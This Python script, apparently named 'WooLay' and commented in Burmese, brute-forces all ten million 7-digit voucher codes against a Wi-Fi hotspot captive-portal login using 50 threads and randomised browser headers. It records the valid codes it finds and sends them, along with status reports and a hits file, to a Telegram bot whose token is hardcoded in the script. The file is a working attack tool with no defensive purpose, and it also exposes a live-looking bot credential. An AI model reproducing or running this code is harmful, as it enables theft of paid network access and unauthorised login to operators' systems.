import requests
import random
import string
import sys
import os
import urllib3
import time
from concurrent.futures import ThreadPoolExecutor

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ==============================================================================
#  CONFIG — ဒီမှာ သင့် Info တွေ ထည့်ပါ
# ==============================================================================

TELEGRAM_BOT_TOKEN = "8806693453:AAEK1F7FTsAHMc5PdfeIYeIlWHJgbnGRb8o"
TELEGRAM_CHAT_ID = "8806693453"

# Session URL — သင့် Portal URL ကို ဒီမှာ ထည့်ပါ
SESSION_URL = "http://www.hotspot.portal.net/login"

# 7 Digit Code — 0000000 ကနေ 9999999 ထိ
CODE_LENGTH = 7
MAX_WORKERS = 50
TIMEOUT = 10

# ==============================================================================
#  TELEGRAM NOTIFIER
# ==============================================================================

def send_telegram(message):
    """Hit ရလျှင် Telegram ကို ပို့သည်"""
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        payload = {
            "chat_id": TELEGRAM_CHAT_ID,
            "text": message,
            "parse_mode": "HTML"
        }
        requests.post(url, json=payload, timeout=10)
    except Exception as e:
        print(f"\033[1;31m[Telegram Error] {e}\033[0m")


def send_telegram_file(text_content, filename="hits.txt"):
    """Hit များစွာ ရလျှင် File အနေနဲ့ ပို့သည်"""
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
        files = {"document": (filename, text_content.encode("utf-8"))}
        data = {"chat_id": TELEGRAM_CHAT_ID, "caption": "🎁 Woolay Hits"}
        requests.post(url, files=files, data=data, timeout=15)
    except Exception as e:
        print(f"\033[1;31m[Telegram File Error] {e}\033[0m")


# ==============================================================================
#  GLOBALS
# ==============================================================================

session = requests.Session()
hit_list = []
tried_count = 0
limit_count = 0
fail_count = 0
start_time = time.time()


def get_speed():
    elapsed = max(time.time() - start_time, 1)
    return int(tried_count / elapsed * 60)


# ==============================================================================
#  LOGIN / CHECK
# ==============================================================================

def login(voucher):
    global tried_count, limit_count, fail_count

    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
        'Cache-Control': 'max-age=0',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': SESSION_URL.rsplit('/', 1)[0] if '/' in SESSION_URL else SESSION_URL,
        'Referer': SESSION_URL,
        'Upgrade-Insecure-Requests': '99',
        'User-Agent': f'Mozilla/5.0 (Linux; Android {random.choice(["6","7","8","9","10","11","12","13","14"])}; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
    }

    data = {
        'dst': f'http://192.168.{random.choice(string.digits)}.{random.choice(string.digits)}/',
        'popup': 'true',
        'username': voucher,
        'password': '',
    }

    try:
        response = session.post(
            SESSION_URL,
            data=data,
            headers=headers,
            verify=False,
            timeout=TIMEOUT,
            allow_redirects=True
        ).text

        tried_count += 1

        if "invalid username or password" in response.lower():
            fail_count += 1
            # 100 ခုတစ်ခါ status ပြ
            if tried_count % 100 == 0:
                speed = get_speed()
                print(f"\033[1;36m[TESTED {tried_count:,}] [SPEED {speed:,}/m] [FAIL {fail_count:,}] [LIMIT {limit_count:,}] [HITS {len(hit_list)}]\033[0m")

        elif "already authorizing, retry later" in response.lower():
            limit_count += 1
            print(f"\033[1;33m⚠️ LIMITED: {voucher}\033[0m")

        elif "you are logged in" in response.lower() or "status" in response.lower():
            # ✅ HIT!
            hit_list.append(voucher)
            print(f"\033[1;32m")
            print(f"╔══════════════════════════════╗")
            print(f"║   🎉🎉🎉 HIT FOUND! 🎉🎉🎉   ║")
            print(f"╚══════════════════════════════╝")
            print(f"  Code: {voucher}")
            print(f"  Time: {time.strftime('%Y-%m-%d %H:%M:%S')}")
            print(f"\033[0m")

            # Save to file
            save_hit(voucher)

            # Send Telegram
            send_telegram(
                f"🎉 <b>HIT FOUND!</b>\n\n"
                f"🔑 Code: <code>{voucher}</code>\n"
                f"⏰ Time: {time.strftime('%Y-%m-%d %H:%M:%S')}\n"
                f"📊 Tested: {tried_count:,}\n"
                f"🚀 Speed: {get_speed():,}/m\n\n"
                f"⚡ Woolay"
            )

        else:
            # Response မှာ အခြားအရာ ပါနေလျှင် — Hit ဖြစ်နိုင်
            hit_list.append(voucher)
            print(f"\033[1;32m")
            print(f"╔══════════════════════════════╗")
            print(f"║   🎉🎉🎉 HIT FOUND! 🎉🎉🎉   ║")
            print(f"╚══════════════════════════════╝")
            print(f"  Code: {voucher}")
            print(f"  Response: {response[:200]}")
            print(f"\033[0m")

            save_hit(voucher)

            send_telegram(
                f"🎉 <b>HIT FOUND!</b>\n\n"
                f"🔑 Code: <code>{voucher}</code>\n"
                f"⏰ Time: {time.strftime('%Y-%m-%d %H:%M:%S')}\n"
                f"📊 Tested: {tried_count:,}\n\n"
                f"⚡ Woolay"
            )

    except requests.exceptions.Timeout:
        tried_count += 1
        print(f"\033[1;31m⏰ Timeout: {voucher}\033[0m")

    except requests.exceptions.ConnectionError:
        tried_count += 1
        print(f"\033[1;31m🔌 Connection Error\033[0m")
        time.sleep(1)

    except Exception as err:
        tried_count += 1
        print(f"\033[1;31m❌ Error: {err}\033[0m")


# ==============================================================================
#  SAVE HIT
# ==============================================================================

def save_hit(code):
    """Hit ကို File မှာ သိမ်းသည်"""
    try:
        now = time.strftime("%Y-%m-%d %H:%M:%S")
        with open("hits.txt", "a", encoding="utf-8") as f:
            f.write(f"[{now}] {code}\n")
    except Exception as e:
        print(f"\033[1;31m[Save Error] {e}\033[0m")


# ==============================================================================
#  GENERATOR — 7 DIGIT
# ==============================================================================

def generator():
    global start_time
    start_time = time.time()

    max_code = 10 ** CODE_LENGTH  # 7 digit = 10,000,000

    print(f"\033[1;36m")
    print(f"╔══════════════════════════════════╗")
    print(f"║     ⚡ WooLay ⚡          ║")
    print(f"║     7 Digit Number Search         ║")
    print(f"╚══════════════════════════════════╝")
    print(f"  URL: {SESSION_URL}")
    print(f"  Workers: {MAX_WORKERS}")
    print(f"  Code Length: {CODE_LENGTH}")
    print(f"  Total Codes: {max_code:,}")
    print(f"  Telegram: ON")
    print(f"\033[0m")

    # Start Telegram ကို အသိပေး
    send_telegram(
        f"⚡ <b>NGATON Scanner Started</b>\n\n"
        f"🔗 URL: <code>{SESSION_URL}</code>\n"
        f"🔢 Digits: {CODE_LENGTH}\n"
        f"👥 Workers: {MAX_WORKERS}\n"
        f"📊 Total: {max_code:,}\n\n"
        f"🔍 Scanning..."
    )

    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as worker:
        for i in range(0, max_code):
            voucher = str(i).zfill(CODE_LENGTH)
            worker.submit(login, voucher)

    # Scan ပြီးလျှင် Summary ပို့
    elapsed = time.time() - start_time
    summary = (
        f"💀 <b>Scan Complete</b>\n\n"
        f"📊 Tested: <code>{tried_count:,}</code>\n"
        f"🩸 Hits: <code>{len(hit_list)}</code>\n"
        f"⚠️ Limits: <code>{limit_count:,}</code>\n"
        f"❌ Failed: <code>{fail_count:,}</code>\n"
        f"⏱️ Time: {int(elapsed//60)}m {int(elapsed%60)}s\n\n"
    )

    if hit_list:
        summary += "🎁 <b>Hits:</b>\n"
        for h in hit_list:
            summary += f"  ▸ <code>{h}</code>\n"

    send_telegram(summary)

    # Hits file ပို့
    if hit_list:
        try:
            with open("hits.txt", "r") as f:
                content = f.read()
            send_telegram_file(content)
        except Exception:
            pass

    print(f"\n\033[1;32m[DONE] Hits: {len(hit_list)} | Tested: {tried_count:,}\033[0m")


# ==============================================================================
#  MAIN
# ==============================================================================

if __name__ == "__main__":
    generator()
